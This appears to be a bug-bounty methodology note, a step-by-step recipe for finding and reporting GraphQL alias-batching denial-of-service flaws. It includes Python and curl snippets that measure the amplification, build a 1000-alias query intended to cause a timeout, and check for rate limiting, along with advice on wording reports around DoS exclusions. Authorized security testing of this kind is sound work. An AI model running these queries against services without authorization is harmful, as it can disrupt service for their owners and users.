# GraphQL Alias Batching DoS — Exploitation Recipe

## Trigger
- GraphQL endpoint accessible without auth (or with low-priv auth)
- No query complexity limits observed during introspection

## Technique

### 1. Confirm no auth on GraphQL layer
```bash
curl -sk -X POST "$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __typename }"}'
# If 200 + valid response → no auth
```

### 2. Baseline timing (single query)
```python
import requests, time
start = time.time()
r = requests.post(TARGET, json={"query": "{ __typename }"}, headers=H, verify=False)
baseline = time.time() - start
print(f"Baseline: {baseline:.3f}s")
```

### 3. Escalation — measure linear amplification
```python
for count in [10, 50, 100, 200, 500]:
    query = "{ " + " ".join([f'a{i}: <cheapest_field>(args) {{ field }}' for i in range(count)]) + " }"
    start = time.time()
    r = requests.post(TARGET, json={"query": query}, headers=H, verify=False, timeout=30)
    elapsed = time.time() - start
    print(f"{count:>4} aliases: {elapsed:.3f}s | {len(r.text):>6} bytes")
```

**Key:** Use the cheapest read operation available (get_info, __typename, etc.) to isolate server processing cost from actual data retrieval.

### 4. DoS trigger (timeout threshold)
```python
query = "{ " + " ".join([f'a{i}: <operation>(args) {{ all_fields }}' for i in range(1000)]) + " }"
# With FULL field selection → maximizes per-alias processing cost
# Expected: server timeout (>20s) or connection drop
```

### 5. Rate limit verification
```python
# 20 rapid sequential requests
for i in range(20):
    r = requests.post(TARGET, json={"query": "{ __typename }"}, headers=H, verify=False)
    # If all 200 → no rate limiting
```

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| No auth + no rate limit + timeout at 1000 aliases | High (CVSS 7.5) |
| Auth required + no rate limit + timeout | Medium (authenticated DoS) |
| No auth + rate limited but high threshold | Medium |
| Auth required + rate limited | Low/Informational |

## CWE / CVSS
- CWE-770: Allocation of Resources Without Limits or Throttling
- CWE-400: Uncontrolled Resource Consumption
- CVSS 3.1: AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H = 7.5 (unauthenticated)

## Report Framing
**DO:** Frame as "single request causes N seconds of server processing, no auth needed, no rate limit"
**DO:** Include timing table showing linear amplification
**DO:** Show 1 request → 1000 backend ops (amplification factor)
**DON'T:** Actually DoS the server — measure at 500 aliases, extrapolate to 1000

## Key Observations (from LINE WORKS engagement)
- "Cookie error" at app layer (not 401/403 at gateway) = GraphQL layer has zero auth, only backend checks session
- Error messages like "attempt to index field 'target'" reveal backend stack (Lua/OpenResty)
- If write operations (batch_send_message, etc.) return business logic errors instead of auth errors → they PROCESS without auth (even if downstream fails)
- Separate the DoS finding from the introspection finding — different CWE, different impact vector

## Program Exclusion Check
⚠️ Some programs explicitly exclude DoS. Check before submitting:
- IssueHunt LINE WORKS: "No DoS / service disruption" in rules BUT this is a VULNERABILITY (resource exhaustion via design flaw), not an active DoS attack. Frame as "missing security control" not "I DoS'd your server."
- YesWeHack Ant Group: DoS explicitly non-qualifying. Do NOT submit DoS findings there.
